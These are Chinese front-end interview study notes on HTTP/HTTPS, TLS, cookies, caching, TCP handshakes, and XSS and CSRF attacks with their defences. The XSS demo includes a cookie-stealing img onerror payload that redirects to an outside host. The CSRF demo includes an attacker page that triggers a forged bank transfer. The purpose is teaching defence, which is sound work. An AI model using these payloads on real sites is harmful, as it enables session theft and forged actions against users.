# HTTP

## 说一下`HTTP`和`HTTPS`

> `http`和`https`的基本概念

`HTTP`: 超文本传输协议，是互联网上应用最为广泛的一种网络协议，是一个客户端和服务器端请求和应答的标准（**基于TCP**），用于从WWW服务器传输超文本到本地浏览器的传输协议，它可以使浏览器更加高效，使网络传输减少。

`HTTPS`: 是以安全为目标的HTTP通道，简单讲是HTTP的安全版，即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。

`HTTPS`协议的主要作用是：建立一个信息安全通道，来确保数组的传输，确保网站的真实性。

> `http`和`https`的区别？

`http`传输的数据都是未加密的，也就是明文的，网景公司设置了`SSL`协议来对`http`协议传输的数据进行加密处理，简单来说`https`协议是由`http`和`ssl`协议构建的可进行**加密传输**和**身份认证**的网络协议，比`http`协议的安全性更高。

主要区别：

1. HTTPS协议需要`CA`证书，费用较高
2. HTTP是超文本传输协议，信息是明文传输，而HTTPS是带有SSL加密传输的，更加安全
3. 二者使用不同的链接方式，端口也不同，一般HTTP协议是80端口，HTTPS是443端口
4. HTTP连接简单，无状态；HTTPS需要有一个**SSL的加密认证过程，更为复杂，服务器处理时间会更长**

> CA机构颁布数字证书（公钥证书）详细过程

关于CA机构颁布数字证书（公钥证书）的详情：

![](https://tva1.sinaimg.cn/large/e6c9d24egy1gznevjng5yj20ux0msdjh.jpg)

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h0k390cydlj21c80qqgp4.jpg)

CA 签发证书的过程，如上图左边部分：

* ⾸先 CA 会把持有者的公钥、⽤途、颁发者、有效时间等信息打成⼀个包，然后对这些信息进⾏ Hash 计算，得到⼀个 Hash 值；

* 然后 CA 会使⽤⾃⼰的私钥将该 Hash 值加密，⽣成 Certificate Signature，也就是 CA 对证书做了签名；

* 最后将 Certificate Signature 添加在⽂件证书上，形成数字证书；

客户端校验服务端的数字证书的过程，如上图右边部分：

* ⾸先客户端会使⽤同样的 Hash 算法获取该证书的 Hash 值 H1；

* 通常浏览器和操作系统中集成了 CA 的公钥信息，浏览器收到证书后可以使⽤ CA 的公钥解密 Certificate Signature 内容，得到⼀个 Hash 值 H2 ；

* 最后⽐较 H1 和 H2，如果值相同，则为可信赖的证书，否则则认为证书不可信。

> `https`协议的优点

1. 使用HTTPS协议可**认证用户和服务器，确保数据发送到正确的客户机和服务器**；

2. HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比HTTP协议**安全**，可防止数据在传输过程中不被窃取、改变，**确保数据的完整性**

3. HTTPS是现行架构下最安全的解决方案，虽然不是绝对安全，但它大幅增加了中间人攻击的成本

* 总结：
  1. 保证数据的**安全和完整性** 
  2. 可认证用户与服务器，**保证数据的传递正确性**

> `https`协议的缺点

1. HTTPS握手阶段比较费时，会使页面加载时间延长50%，增加10%~20%的耗电。
2. SSL证书也需要钱，功能越强大的证书费用越高。
3. HTTPS连接服务器端资源占用高，相同负载下会增加带宽和服务器投入成本;
4. HTTPS缓存不如HTTP高效，会增加数据开销。
5. SSL证书通常需要绑定固定IP，为服务器增加固定IP会增加一定费用;

总结：**费时（客户端页面加载）、费钱、费性能（服务端资源占用）**

## https工作原理的详细介绍 (CA认证在前一个知识点)

SSL/TLS 协议基本流程：

* 客户端向服务器索要并验证服务器的公钥。

* 双⽅协商⽣产「会话秘钥」。

* 双⽅采⽤「会话秘钥」进⾏加密通信。

前两步也就是 SSL/TLS 的建⽴过程，也就是握⼿阶段。

SSL/TLS 的「握⼿阶段」涉及四次通信，可⻅下图：

![](https://tva1.sinaimg.cn/large/e6c9d24egy1gzpnjpvuy4j20u01iin13.jpg)

*1. ClientHello*

首先，由客户端向服务器发起加密通信请求，也就是 `ClientHello` 请求。

在这一步，客户端主要向服务器发送以下信息：

（1）客户端支持的 SSL/TLS 协议版本，如 TLS 1.2 版本。

（2）客户端生产的随机数（`Client Random`），后面用于生产「会话秘钥」。

（3）客户端支持的密码套件列表，如 RSA 加密算法。

*2. SeverHello*

服务器收到客户端请求后，向客户端发出响应，也就是 `SeverHello`。服务器回应的内容有如下内容：

（1）确认 SSL/ TLS 协议版本，如果浏览器不支持，则关闭加密通信。

（2）服务器生产的随机数（`Server Random`），后面用于生产「会话秘钥」。

（3）确认的密码套件列表，如 RSA 加密算法。

（4）服务器的数字证书。

*3.客户端回应*

客户端收到服务器的回应之后，首先通过浏览器或者操作系统中的 CA 公钥，确认服务器的数字证书的真实性。

如果证书没有问题，客户端会从数字证书中取出服务器的公钥，然后使用它加密报文，向服务器发送如下信息：

（1）一个随机数（`pre-master key`）。该随机数会被服务器公钥加密。

（2）加密通信算法改变通知，表示随后的信息都将用「会话秘钥」加密通信。

（3）客户端握手结束通知，表示客户端的握手阶段已经结束。这一项同时把之前所有内容的发生的数据做个摘要，用来供服务端校验。

`上面第一项的随机数是整个握手阶段的第三个随机数，这样服务器和客户端就同时有三个随机数，接着就用双方协商的加密算法，各自生成本次通信的「会话秘钥」。`

*4. 服务器的最后回应*

服务器收到客户端的第三个随机数（`pre-master key`）之后，通过协商的加密算法，计算出本次通信的「会话秘钥」。然后，向客户端发生最后的信息：

（1）加密通信算法改变通知，表示随后的信息都将用「会话秘钥」加密通信。

（2）服务器握手结束通知，表示服务器的握手阶段已经结束。这一项同时把之前所有内容的发生的数据做个摘要，用来供客户端校验。

至此，整个 SSL/TLS 的握手阶段全部结束。接下来，客户端与服务器进入加密通信，就完全是使用普通的 HTTP 协议，只不过用「会话秘钥」加密内容。

更多细节: https://mp.weixin.qq.com/s/bUy220-ect00N4gnO0697A

## 在HTTPS中SSL加密的过程，使用了什么算法？

1. RSA 密钥交换算法 (不支持前向保密)

2. hash算法

其实在CA机构签发证书的时候,还用了hash算法

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h0k390cydlj21c80qqgp4.jpg)

3. DH 密钥协商算法 (因为RSA不支持前向保密,所以有了他)

4. ECDHE 密钥协商算法 (因为DH算法效率问题,所以有了他,现在大多数网站所用的密钥协商算法)

## cookie localStorage sessionStorage区别

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1gdggznjvj20nk0bx0uz.jpg)

补充：

cookie数据还有路径（path）的概念，可以限制。cookie只属于某个路径下

**作用域不同：sessionStorage 不在不同的浏览器窗口中共享，即使是同一个页面；localStorage 在所有同源窗口都是共享的；cookie 也是在所有同源窗口中共享的**

<mark>localStorage 和 cookie 一样也有跨域限制</mark>

## cookie和session的区别

1. cookie数据是存放在与客户端，而session数据是存放在服务端的
2. cookie不安全，别人可以分析存放在本地的cookie并进行cookie欺骗（例如`CSRF`跨站请求伪造）
3. 由于session是在服务端的，固当访问增多时，会对服务器性能造成影响
4. 单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie

## 什么是浏览器缓存（缓存的都是啥？）

==浏览器缓存就是把一个已经请求过的Web资源（如HTML、CSS、JS、图片、数据等）拷贝一份副本存储在浏览器中。当下一个q请求到来时，如果是相同的`URL`，缓存会根据缓存机制（缓存策略）决定是直接拉取浏览器缓存（强缓存），还是向源服务器再次请求。==

查看再次（二次）请求是否来自缓存:（通过刷新页面）

![](https://tva1.sinaimg.cn/large/008i3skNgy1gwutz8gm6sj31hb0tzjzh.jpg)

## 强缓存和协商缓存

缓存分为两种：强缓存和协商缓存，根据响应的**header**内容来决定

|          | 获取资源形式 | 状态码              | 发送请求到服务器                     |
| -------- | ------------ | ------------------- | ------------------------------------ |
| 强缓存   | 从缓存取     | 200（from cache）   | ==否，直接从缓存取==                 |
| 协商缓存 | 从缓存取     | 304（not modified） | ==是，通过服务器来告知缓存是否可用== |

* 强缓存相关字段有 HTTP1.0 的 expires ，HTTP1.1 的`cache-control`。如果`cache-control`与`expires`同时存在的话,**`cache-control`的优先级高于`expires`**

* 协商缓存相关字段有 HTTP1.0 中`Last-Modified/If-Modified-Since`，HTTP2.0 中`Etag/If-None-Match`

| HTTP1.1       |          | HTTP1.0       |
| ------------- | -------- | ------------- |
| cache-control | **替换** | expires       |
| ETag          | **补充** | Last-modified |

### 强缓存

> cache-control 的字段

* no-cache 和 no-store

  1. no-cache 强制进行协商缓存
  2. no-store 禁止使用任何缓存（策略）

* private 和 public

  用以明确响应资源是否可被代理服务器进行缓存

* max-age 和 s-maxage

  `max-age`比`s-maxage`常用，往往对于大型架构项目时才会使用到`s-maxage`，它表示缓存在代理服务器中的过期时长，且仅当设置了 public 属性才有效

### 协商缓存

在 HTTP1.0 中的 last-modified 存在以下不足：

* 当请求的文件资源进行了编辑，但是内容没有发生任何变化，时间戳也会更新（有效性验证失效，需要重新进行完整的资源请求）
* 标识文件资源修改的时间戳单位为秒（不够精确，万一修改为几百毫秒的情况，就无法感知文件的修改）

所以在 HTTP1.1 中进行改进，添加了 ETag 字段用于补充 last-modified 的不足

## 强缓存、协商缓存什么时候用哪个 (缓存决策)

<img src="https://uploadfiles.nowcoder.com/images/20190312/311436_1552361773903_9DC69E327B4B3691E94CD9D52D10E2C1" style="zoom:87%;" />

如上图，在浏览器第一次发送请求后，需要再次发送请求时，浏览器会首先获取该资源缓存的header信息，然后根据 Cache-Control 和 expires 来判断是否过期（==先查看强缓存==）。若没过期则直接从缓存中获取资源信息，包括缓存的header的信息，所以此次请求不会与服务器进行通信。如果缓存过期，浏览器会向服务器发送请求（==再协商缓存==），本次请求会带着第一次请求返回的有关缓存的header字段信息（也就是第一次请求获取的 ETag 和 Last-Modified ）

<img src="https://tva1.sinaimg.cn/large/008i3skNly1gwsd1z7s4rj31f20qwacy.jpg" style="zoom:40%;" />

参考：[缓存策略](https://zhuanlan.zhihu.com/p/111190645)

## csrf和xss的网络攻击及防范

## 描述一下XSS和CRSF攻击？防御方法？

#### XSS攻击

XSS，（ Cross Site Script，跨站脚本攻击）其原本缩写是 CSS，但为了和层叠样式表(Cascading Style Sheet)有所区分，因而在安全领域叫做 XSS。
XSS 攻击是指攻击者在网站上注入恶意的客户端代码，通过恶意脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。攻击者对客户端网页注入的恶意脚本一般包括 JavaScript，有时也会包含 HTML 和 Flash。有很多种方式进行 XSS 攻击，但它们的共同点为：将一些隐私数据像 cookie、session 发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者的机器上进行一些恶意操作。
XSS攻击可以分为3类：反射型（非持久型）、存储型（持久型）、基于DOM。

1. 反射型
   反射型 XSS 只是简单地把用户输入的数据 “反射” 给浏览器，这种攻击方式往往需要攻击者诱使用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。
2. 存储型
   存储型 XSS 会把用户输入的数据 “存储” 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。
   攻击者在页面中输入以评论、文章等为形式恶意脚本并发送到服务端，当其他用户访问该评论或文章时，服务器会将这段恶意代码返回，而其他用户访问时，恶意脚本就会在浏览器执行。
3. 基于DOM
   基于 DOM 的 XSS 攻击是指通过恶意脚本修改页面的 DOM 结构，是纯粹发生在客户端的攻击。

#### XSS的防范

现在主流的浏览器内置了防范 XSS 的措施，例如==CSP==。但对于开发者来说，也应该寻找可靠的解决方案来防止 XSS 攻击。

1. ==HttpOnly 防止劫取 Cookie==
   HttpOnly 最早由微软提出，至今已经成为一个标准。浏览器将禁止页面的 Javascript 访问带有 HttpOnly 属性的Cookie。
   上文有说到，攻击者可以通过注入恶意脚本获取用户的 Cookie 信息。通常 Cookie 中都包含了用户的登录凭证信息，攻击者在获取到 Cookie 之后，则可以发起 Cookie 劫持攻击。所以，严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。

2. 输入检查

   不要相信用户的任何输入。 对于用户的任何输入要进行检查、过滤和转义。建立可信任的字符和 HTML 标签白名单，对于不在白名单之列的字符或者标签进行过滤或编码。
    在 XSS 防御中，输入检查一般是检查用户输入的数据中是否包含 <，> 等特殊字符，如果存在，则对特殊字符进行过滤或编码，这种方式也称为 XSS Filter。而在一些前端框架中，都会有一份 decodingMap， 用于对用户输入所包含的特殊字符或标签进行编码或过滤，如 <，>，script，防止 XSS 攻击

3. 输出检查

   用户的输入会存在问题，服务端的输出也会存在问题。一般来说，除富文本的输出外，在变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。例如利用 sanitize-html 对输出内容进行有规则的过滤之后再输出到页面中。

4. 转译 `<,>` 等特殊符号

#### CSRF攻击

CSRF，（Cross Site Request Forgery，跨站请求伪造）是一种劫持受信任用户向服务器发送非预期请求的攻击方式。
通常情况下，CSRF 攻击是攻击者借助受害者的 Cookie 骗取服务器的信任，可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击服务器，从而在并未授权的情况下执行在权限保护之下的操作。
先说说浏览器的 Cookie 策略
Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。Cookie 主要用于以下三个方面：

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）

而浏览器所持有的 Cookie 分为两种：

- Session Cookie(会话期 Cookie)：会话期 Cookie 是最简单的Cookie，它不需要指定过期时间（Expires）或者有效期（Max-Age），它仅在会话期内有效，浏览器关闭之后它会被自动删除。
- Permanent Cookie(持久性 Cookie)：与会话期 Cookie 不同的是，持久性 Cookie 可以指定一个特定的过期时间（Expires）或有效期（Max-Age）。

此外，每个 Cookie 都会有与之关联的域，这个域的范围一般通过 donmain 属性指定。如果 Cookie 的域和页面的域相同，那么我们称这个 Cookie 为第一方 Cookie（first-party cookie），如果 Cookie 的域和页面的域不同，则称之为第三方 Cookie（third-party cookie）。一个页面包含图片或存放在其他域上的资源（如图片）时，第一方的 Cookie 也只会发送给设置它们的服务器。
由于 Cookie 中包含了用户的认证信息，当用户访问攻击者准备的攻击环境时，攻击者就可以对服务器发起 CSRF 攻击。在这个攻击过程中，攻击者借助受害者的 Cookie 骗取服务器的信任，但并不能拿到 Cookie，也看不到 Cookie 的内容。而对于服务器返回的结果，由于浏览器同源策略的限制，攻击者也无法进行解析。因此，攻击者无法从返回的结果中得到任何东西，他所能做的就是给服务器发送请求，以执行请求中所描述的命令，在服务器端直接改变数据的值，而非窃取服务器中的数据。但若 CSRF 攻击的目标并不需要使用 Cookie，则也不必顾虑浏览器的 Cookie 策略了。

总结：当用户访问攻击者准备的攻击环境时，攻击者获取用户的Cookie信息，骗取服务器的信任，通过伪造请求，修改服务器中的数据！

#### CSRF的防范

1. 验证码
   验证码被认为是对抗 CSRF 攻击最简洁而有效的防御方法。
   从上述示例中可以看出，CSRF 攻击往往是在用户不知情的情况下构造了网络请求。而验证码会强制用户必须与应用进行交互，才能完成最终请求。因为通常情况下，验证码能够很好地遏制 CSRF 攻击。
   但验证码并不是万能的，因为出于用户考虑，不能给网站所有的操作都加上验证码。因此，验证码只能作为防御 CSRF 的一种辅助手段，而不能作为最主要的解决方案。

2. ==Referer Check==
   根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。通过 Referer Check，可以检查请求是否来自合法的 “源”。
   比如，如果用户要删除自己的帖子，那么先要登录 [www.c.com](http://www.c.com)，然后找到对应的页面，发起删除帖子的请求。此时，Referer 的值是 http://www.c.com；当请求是从 [www.a.com](http://www.a.com) 发起时，Referer 的值是 http://www.a.com 了。因此，要防御 CSRF 攻击，只需要对于每一个删帖请求验证其 Referer 值，如果是以 [www.c.com](http://www.c.com) 开头的域名，则说明该请求是来自网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是 CSRF 攻击，可以拒绝该请求。

   Referer Check 不仅能防范 CSRF 攻击，另一个应用场景是 “防止图片盗链”。

3. 添加 token 验证
   CSRF 攻击之所以能够成功，是因为攻击者可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 Cookie 中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的 Cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入攻击者所不能伪造的信息，并且该信息不存在于 Cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。

4. 通过给Cookie设置 `SameSite` 属性（具体看下一个问题！）

## <mark>哪些情况和设置，请求不会携带cookie</mark>

Chrome 51 开始，浏览器的 Cookie 新增加了一个`SameSite`属性，用来防止 CSRF 攻击和用户追踪。

Cookie 的`SameSite`属性用来限制第三方 Cookie，从而减少安全风险。

它可以设置三个值。

> - Strict
> - Lax
> - None

### Strict

`Strict`最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。

> ```bash
> Set-Cookie: CookieName=CookieValue; SameSite=Strict;
> ```

这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。

### Lax

`Lax`规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。

> ```markup
> Set-Cookie: CookieName=CookieValue; SameSite=Lax;
> ```

导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。

| 请求类型  | 示例                                 | 正常情况    | Lax         |
| --------- | ------------------------------------ | ----------- | ----------- |
| 链接      | `<a href="..."></a>`                 | 发送 Cookie | 发送 Cookie |
| 预加载    | `<link rel="prerender" href="..."/>` | 发送 Cookie | 发送 Cookie |
| GET 表单  | `<form method="GET" action="...">`   | 发送 Cookie | 发送 Cookie |
| POST 表单 | `<form method="POST" action="...">`  | 发送 Cookie | 不发送      |
| iframe    | `<iframe src="..."></iframe>`        | 发送 Cookie | 不发送      |
| AJAX      | `$.get("...")`                       | 发送 Cookie | 不发送      |
| Image     | `<img src="...">`                    | 发送 Cookie | 不发送      |

设置了`Strict`或`Lax`以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。

### None

Chrome 计划将`Lax`变为默认设置。这时，网站可以选择显式关闭`SameSite`属性，将其设为`None`。不过，前提是必须同时设置`Secure`属性（Cookie 只能通过 HTTPS 协议发送），否则无效。

下面的设置无效。

> ```bash
> Set-Cookie: widget_session=abc123; SameSite=None
> ```

下面的设置有效。

> ```bash
> Set-Cookie: widget_session=abc123; SameSite=None; Secure
> ```

## 模拟 XSS 攻击

使用 Vue 创建项目，进行模拟（关键在于使用了==`v-html`==）

关键代码：

```html
<template>
  <div class="home">
    <h2>XSS 攻击模拟</h2>

    <!-- 输入框 -->
    <input type="text" v-model="text">
    <button id="btn" @click="addSubmit">添加评论</button>

    <h4>评论：</h4>
    <ul>
      <li v-for="(item, index) in msgList" :key='index'>
        <!-- 关键在于使用v-html导致的问题 -->
        <span v-html="item"></span>
      </li>
    </ul>

    <!-- 
        各类攻击方式：
          # 跳转到攻击者的网站 
          <img src="123" onerror="location.href='http://mrkleo.run:7788';">
          # 盗取用户cookie
          <img src="123" onerror="alert('我获取到你的cookie了：' + document.cookie)">
          # 获取他人cookie后，跳转到攻击者的网站
          <img src="123" onerror="location.href='http://mrkleo.run:7788/' + document.cookie">
    -->

  </div>
</template>

<script>
export default {
  name: 'Home',
  data() {
    return {
      text: '',
      msgList: []
    }
  },
  components: {
  },
  methods: {
    addSubmit() {
      // 本地缓存模拟网站数据库
      let arr = [];
      arr = localStorage.getItem('item');
      arr = JSON.parse(arr);
      !arr && (arr = []);
      arr.push(this.text);
      this.msgList = arr;
      this.text = '';
      localStorage.setItem('item', JSON.stringify(arr));
    }
  }

}
</script>

<style lang="less" scoped>
#btn {
  margin-left: 15px;
}
</style>
```

实现效果：

<img src="https://tva1.sinaimg.cn/large/008i3skNly1gwsru0bq5rj30f50gq0t5.jpg" style="zoom:67%;" />

攻击者输入攻击脚本：

```html
<img src="123" onerror="location.href='http://mrkleo.run:7788/' + document.cookie">
```

当其他用户再进行评论时，会出现如下情况：

用户输入完评论，提交后，便会执行脚本，获取用户`Cookie`信息并跳转到攻击者网站！

效果：

<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gwsrx9yremj30nb0d5gms.jpg" style="zoom:80%;" />

查看网站的数据库（用缓存模拟的）：

![](https://tva1.sinaimg.cn/large/008i3skNly1gwss0cd4akj31hb0puwhz.jpg)

## 模拟 CSRF 攻击

> 建立银行网站（端口 3001）

1. 用户需要先访问接口 `/auth（认证，模拟获取服务器传来的 cookie）`
2. 然后访问接口 `/transfer`进行转账

indexRouter

```js
var express = require("express");
var router = express.Router();
const jwt = require("jsonwebtoken");

/* GET home page. */
router.get("/", function (req, res, next) {
  res.render("index", {
    title: "银行网站",
  });
});

module.exports = router;
```

authRouter（模拟获取服务器的 Cookie）

```js
var express = require('express');
var router = express.Router();

router.get('/', function (req, res, next) {
    res.cookie('userId', 'ce032b305a9bc1ce0b0dd2a', {
        expires: new Date(Date.now() + 900000)
    })
    res.end('ok')
});

module.exports = router;
```

transferRouter（验证用户 Cookie 信息，并进行转账）

```js
var express = require('express');
var router = express.Router();

router.get('/', function(req, res, next) {
  const { query } = req;
  const { userId } = req.cookies;
  if(userId){
    res.send({
      status: 'transfer success',
      transfer: query.number
    })
  }else{
    res.send({
      status: 'error',
      transfer: ''
    })
  }
});

module.exports = router;
```

index.ejs

```ejs
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>
    <%= title %>
  </title>
</head>

<body>
  <h2>
    转账
  </h2>
  <script>
    const h2 = document.querySelector('h2');
    h2.addEventListener('click', () => {
      fetch('/transfer?number=1000&to=Bob').then(res => {
        console.log(res.json());
      })
    })
  </script>
</body>

</html>
```

效果：

1. 验证用户，模拟获取服务器传来的 Cookie 信息

![](https://tva1.sinaimg.cn/large/008i3skNly1gwts0dgfvxj325f0u07a1.jpg)

2. 向`Bob`转账1000元

![](https://tva1.sinaimg.cn/large/008i3skNly1gwts33zpyej31of0u0n27.jpg)

![](https://tva1.sinaimg.cn/large/008i3skNly1gwts4zme1wj31gf0u079g.jpg)

> 建立攻击者网站（端口3002）

index.ejs

```ejs
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>
    <%= title %>
  </title>
</head>

<body>
  <img src="http://localhost:3001/transfer?number=3000000&to=Jack">
</body>

</html>
```

当在银行网站的用户，获取到 Cookie 信息后，被垃圾链接跳转到了攻击者网站时，将自动请求 img 中的 src 的资源

效果如下：

![](https://tva1.sinaimg.cn/large/008i3skNgy1gwtsbn7o49j31c20u0gre.jpg)

以上就是模拟的`CSRF`攻击

> 如何防范

1. 验证码
2. `Referer`检查（发起请求时，有篡改`Referer`的可能，所以效果一般）

更改 transferRouter

```js
var express = require('express');
var router = express.Router();

const csrfGuard = require('../middleware/csrfGuard')
router.get('/', csrfGuard, function(req, res, next) {
  const { query } = req;
  const { userId } = req.cookies;
  if(userId){
    res.send({
      status: 'transfer success',
      transfer: query.number
    })
  }else{
    next()
  }
});
router.get('/', function(req, res, next) {
  res.send({
    status: 'error',
    transfer: ''
  })
});

module.exports = router;
```

csrfGuard.js

```js
module.exports = function (req, res, next) {
    const [Referer, Origin] = [req.get('Referer'), req.get('Origin')]
    if (Referer && Referer.indexOf('http://localhost:3001/') >= 0) {
        next();
    } else if (Origin && Origin.indexOf('http://localhost:3001/') >= 0) {
        next();
    } else {
        console.log('拦截攻击者（其他）网站请求');
        next('route')
    }
}
```

当攻击者网站请求时

![](https://tva1.sinaimg.cn/large/008i3skNly1gwttcyimkpj30ou09ddhb.jpg)

服务器拦截成功！

3. `JWT token` 验证（最佳）

```bash
npm install jsonwebtoken --save
```

更改 indexRouter

```js
var express = require("express");
var router = express.Router();
const jwt = require("jsonwebtoken");

/* GET home page. */
router.get("/", function (req, res, next) {
  res.render("index", {
    title: "银行网站",
    // 渲染到页面的 token
    token: jwt.sign({
      username: 'leo',
      post: 'mentor'
    }, 'secret', {
      expiresIn: '1d'
    })
  });
});

module.exports = router;
```

更改 transferRouter

```js
var express = require('express');
var router = express.Router();

const tokenVerify = require('../middleware/tokenVerify')

router.get('/', tokenVerify, function(req, res, next) {
  const { query } = req;

  // jwt验证通过
  if(req.decode) {  
    res.send({
      status: 'transfer success',
      transfer: query.number
    })
  }

});

module.exports = router;
```

tokenVerify.js

```js
const jwt = require("jsonwebtoken");

module.exports = function (req, res, next) {
    const {
        token
    } = req.query;
    jwt.verify(token, 'secret', (err, decode) => {
        if (err) {
            console.log('jwt验证失败！！');
            next('route')
        } else {
            // 验证通过，将解密信息存储至 req.decode
            req.decode = decode;
            next()
        }
    })
}
```

修改 index.ejs（银行网站，3001端口）

```ejs
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>
    <%= title %>
  </title>
</head>

<body>
  <h2>
    转账
  </h2>
  <span id='token' data-token=<%= token %>></span>
  <script>
    const h2 = document.querySelector('h2');
    const tokenElem = document.querySelector('#token');
    const token = tokenElem.dataset.token;
    h2.addEventListener('click', () => {
      fetch('/transfer?number=15000&to=Bob&token=' + token).then(res=>{
        console.log(res.json());
      })
    })
  </script>
</body>

</html>
```

效果如下：

![](https://tva1.sinaimg.cn/large/008i3skNgy1gwttk04jmdj31d50u0af3.jpg)

![](https://tva1.sinaimg.cn/large/008i3skNgy1gwttklokizj30oo09m3zz.jpg)

服务器拦截成功！！

## 说一下你知道的网络攻击

> 1. XSS: 攻击者输入评论 => `<img src="123" onerror="location.href='http://mrkleo.run:7788/' + document.cookie">`

措施：

1. 输入检查：`<,>`

2. 输出检查：从服务器返回的数据，需要对其进行检查

3. 转译 `<,>`等特殊符号

4. 设置httpOnly = true，使其无法通过js获取cookie

> 2. CSRF: 攻击者获取用户cookie和服务器对应接口api，然后修改服务器数据库，实现转账等操作

场景：用户在登陆银行网站后，通过垃圾链接点进攻击者网站，实现请求

措施：

1. 在服务端查看请求的源 refer 是否是本网站的

2. token验证（jwt）

3. 验证码

4. 给Cookie设置SameSite属性

- strict（严格限制第三方Cookie）

- Lax（可以放宽一些请求，例如get请求、预加载、a标签链接）

- None

> 3. DDos：攻击者利用海量的僵尸服务器攻击源站，占用源站服务器资源，使其他用户无法访问到源站

> 4. SQL注入

攻击者在HTTP请求中注入恶意SQL命令，例如，drop table users，服务器用请求参数构造数据库SQL命令时，恶意SQL被执行。

**解决**：后台处理，例如，使用预编译语句PreparedStatement进行预处理。

> 5. 网络劫持

- DNS劫持（涉嫌违法）：修改运行商的 DNS 记录，重定向到其他网站。DNS 劫持是违法的行为，目前 DNS 劫持已被监管，现在很少见 DNS 劫持
- HTTP劫持：前提有 HTTP 请求。因 HTTP 是明文传输，运营商便可借机修改 HTTP 响应内容（如加广告）。

措施：全站 HTTPS

> 6. 中间人攻击

## TCP三次握手，四次挥手（为什么是三次？）

### 三次握手

![](https://tva1.sinaimg.cn/large/e6c9d24egy1gzi23cgkx7j20ws0gcju3.jpg)

### （三次握手）为什么是三次握手，而不是两次？

> 从几个方面来解释

* **确认双方的收发能力(片面)**

​        第一次的 C -> S：对S来说，确认S的接收能力，确认C的发送能力（C不能确认自己的发送能力）

​        第二次的 S -> C：对C来说，确认S的接收能力和发送能力，同时确认C的接收能力，其次，可确认C的发送能力

​        第三次的 C -> S：对S来说，确认S的发送能力，确认C的接收能力

​        到此：S与C都能相互确认他人和自己的接发能力！

<mark>主要原因:</mark>

- **以阻⽌重复历史连接的初始化(<mark>重要原因</mark>)**

  假如发送端发送了两个SYN包(一个旧的<之前的历史连接,过期的>,一个新的),发送端希望接收端处理新发的SYN包,返回其对应的ACK包,但是由于网络环境的复杂性, 导致旧的SYN先到达接收端, 制使接收端返回对于这个旧的SYN包的SYN + ACK包, 发送端收到该SYN + ACK包后,根据上下文比较发现,这不是他要的新SYN包对应的SYN + ACK包,而是一个旧的、过期的历史连接,于是就发送RST终止报文. 

  一段时间后,新的SYN包到达了接收端,接收端返回其对应的SYN + ACK包,发送端根据上下文判断其不是一个历史连接,所以第三次握手发送一个ACK包作为应答.至此建立连接.

  如果只是两次握手,发送端无法根据上下文判断是否是一个历史连接, 三次握⼿则可以在客户端（发送⽅）准备发送第三次报⽂时，客户端因有⾜够的上下⽂来判断当前连接是否是历史连接.

  ![](https://tva1.sinaimg.cn/large/e6c9d24ely1h10994melsj20u012owi2.jpg)

* **同步双⽅初始序列号**

  TCP 协议的通信双⽅， 都必须维护⼀个「序列号」， 序列号是可靠传输的⼀个关键因素，它的作⽤：

  1. 接收⽅可以去除重复的数据；

  2. 接收⽅可以根据数据包的序列号按序接收；

  3. 标识发送出去的数据包中， 哪些是已经被对⽅收到的；

  当客户端发送携带「初始序列号」的 SYN 报⽂的时候，需要服务端回⼀个 ACK 应答报⽂,表示客户端的SYN报文已被服务端成功接收; 那当服务端发送「初始序列号」给客户端时,依然也要得到客户端的应答回应.**这样一来一回, 才能确保双⽅的初始序列号能被可靠的同步**
  而两次握手只保证了发送方(客户端)的初始序列号被确认同步, 而没办法保证双⽅的初始序列号都能被确认接收。

* **避免资源浪费**

  前提: 假设只是两次握手建立连接. 

